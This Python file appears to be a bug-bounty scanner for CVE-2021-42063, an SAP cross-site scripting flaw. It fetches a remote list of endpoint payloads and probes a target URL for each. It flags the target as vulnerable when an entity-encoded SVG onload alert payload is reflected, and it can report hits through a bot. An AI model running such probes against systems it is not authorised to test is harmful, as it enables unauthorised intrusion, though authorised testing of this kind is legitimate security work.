#!/usr/bin/env python

"""
 * CVE-2021-42063
 * CVE-2021-42063 Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * @Developed By Cappricio Securities <https://cappriciosec.com>
 */
 
"""
from cve202142063.includes import bot
from cve202142063.utils import configure
import requests
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
from cve202142063.includes import writefile
from cve202142063.utils import const
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def cvescan(url, output):
    try:
        with requests.Session() as session:
            payreq = session.get(const.Data.payloadurl)
            for endpoint in payreq.text.splitlines():
                encode = quote(endpoint)
                fullurl = f'{url}{endpoint}'
                try:
                    response = session.get(fullurl, headers=const.Data.rheaders, verify=False, timeout=5)
                    print(f'Checking ===> {fullurl}')
                    if f'<SVG ONLOAD=&#97&#108&#101&#114&#116(&#X64&#X6F&#X63&#X75&#X6D&#X65&#X6E&#X74&#X2E&#X64&#X6F&#X6D&#X61&#X69&#X6E)>' in response.text and 'SAPIKS2' in response.text:
                         outputprint = (
                              f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                              f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                              f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n"
                              )
                         print(outputprint)
                         if configure.check_id() == "Exist":
                                bot.sendmessage(fullurl)
                         if output is not None:
                                writefile.writedata(
                                    output, str(f'{fullurl}\n'))
                         break
                        
                except requests.exceptions.RequestException as e:
                    print(
                        f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")
